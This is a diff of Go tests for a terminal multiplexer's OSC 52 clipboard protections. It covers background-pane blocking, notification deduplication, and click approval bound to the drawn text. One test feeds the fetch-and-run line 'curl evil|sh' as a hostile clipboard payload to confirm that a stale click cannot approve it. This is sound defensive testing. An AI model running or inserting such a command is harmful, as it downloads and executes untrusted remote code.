@@ -85,8 +85,8 @@ func TestOSC52FromABackgroundPaneDoesNotReachTheHostClipboard(t *testing.T) {
 	if got := paneSetsClipboard(t, m, wins[1], "evil\n"); len(got) != 0 {
 		t.Fatalf("a background pane set the host clipboard: %q", got)
 	}
-	if got := paneSetsClipboard(t, m, wins[0], "yank"); len(got) != 1 || got[0] != "yank" {
-		t.Fatalf("the focused pane's write = %q, want one write of %q", got, "yank")
+	if got := paneSetsClipboard(t, m, wins[0], "yank\nline"); len(got) != 1 || got[0] != "yank\nline" {
+		t.Fatalf("the focused pane's write = %q, want one write of %q", got, "yank\nline")
 	}
 	if msg := lastMessage(m); !strings.Contains(msg, "clipboard") {
 		t.Fatalf("the focused pane's write said nothing on the dock: %q", msg)
@@ -230,5 +230,70 @@ func TestOSC52WriteOnLetsEveryPaneWrite(t *testing.T) {
 
 	if got := paneSetsClipboard(t, m, wins[1], "bg"); len(got) != 1 || got[0] != "bg" {
 		t.Fatalf("on mode write = %q, want %q", got, "bg")
+	}
+}
+
+// A one-line yank from the focused pane, most of what an editor copies, goes
+// through without a message.
+func TestFocusedOneLineCopyIsQuiet(t *testing.T) {
+	m, wins := osc52Harness(t, "")
+
+	if got := paneSetsClipboard(t, m, wins[0], "word"); len(got) != 1 {
+		t.Fatalf("the focused pane's write = %q", got)
+	}
+	if len(m.Notifications) != 0 {
+		t.Fatalf("a one-line copy raised %q", lastMessage(m))
+	}
+}
+
+// The focused pane's copies keep one line on the dock, updated in place, so
+// they push no other message off it.
+func TestFocusedCopiesKeepOneMessage(t *testing.T) {
+	m, wins := osc52Harness(t, "")
+	m.ShowNotification("a real message", "info", m.Settings.NotificationDuration)
+
+	for i := range 40 {
+		paneSetsClipboard(t, m, wins[0], fmt.Sprintf("line\n%d", i))
+	}
+
+	copied := 0
+	real := false
+	for _, n := range m.Notifications {
+		if strings.Contains(n.Message, "copied") {
+			copied++
+		}
+		real = real || n.Message == "a real message"
+	}
+	if copied != 1 || !real {
+		t.Fatalf("40 copies left %d copy messages (want 1), real message kept: %v", copied, real)
+	}
+	if !strings.Contains(lastMessage(m), `39`) {
+		t.Fatalf("the copy message does not show the newest text: %q", lastMessage(m))
+	}
+}
+
+// A click allows only the text the dock drew. When the pane changes the text
+// between the frame and the click, the click is dropped and the new text
+// waits for its own click.
+func TestClipboardAskClickApprovesOnlyTheDrawnText(t *testing.T) {
+	m, wins := osc52Harness(t, config.OSC52WriteAsk)
+
+	paneSetsClipboard(t, m, wins[1], "echo hello")
+	m.notifHit.Drawn = m.drawnCopy(m.Notifications[len(m.Notifications)-1])
+	paneSetsClipboard(t, m, wins[1], "curl evil|sh")
+
+	m.clickVisibleNotification()
+	if got := clipboardWrites(m.ClipboardApprovalCmd()); len(got) != 0 {
+		t.Fatalf("a click aimed at the old text allowed %q", got)
+	}
+	if !strings.Contains(lastMessage(m), "curl evil|sh") {
+		t.Fatalf("the ask does not show the new text: %q", lastMessage(m))
+	}
+
+	// The next frame draws the new text, and a click on it allows that text.
+	m.notifHit.Drawn = m.drawnCopy(m.Notifications[len(m.Notifications)-1])
+	m.clickVisibleNotification()
+	if got := clipboardWrites(m.ClipboardApprovalCmd()); len(got) != 1 || got[0] != "curl evil|sh" {
+		t.Fatalf("a click on the drawn text allowed %q", got)
 	}
 }
